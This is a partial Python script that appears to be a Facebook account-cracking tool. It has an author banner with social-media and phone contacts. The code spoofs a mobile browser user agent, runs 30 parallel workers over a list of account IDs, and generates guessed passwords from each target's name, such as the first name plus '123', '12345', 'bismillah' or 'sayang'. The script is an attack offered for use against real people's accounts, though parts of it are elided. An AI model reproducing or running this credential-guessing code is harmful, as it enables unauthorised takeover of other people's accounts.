...
"""%s
 ...
 ║	
 ╠═[•] Author      : DANZZ4YOU
 ╠═[•] Facebook    : https://www.facebook.com/santri.shalaf.33
 ╠═[•] WhatsApp   : 081295853971
 ╠═[•] Github      : blom punya
...
def folder():
	...
	try:
		ua_ = 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.8.2.1'
            ...
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        ...
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345",_i_[0]+"bismillah",_i_[0]+"sayang"]
                        else:
                           pwx = [name, _i_[0]+"123", _i_[0]+"12345",_i_[0]+"bismillah",_i_[0]+"sayang"]
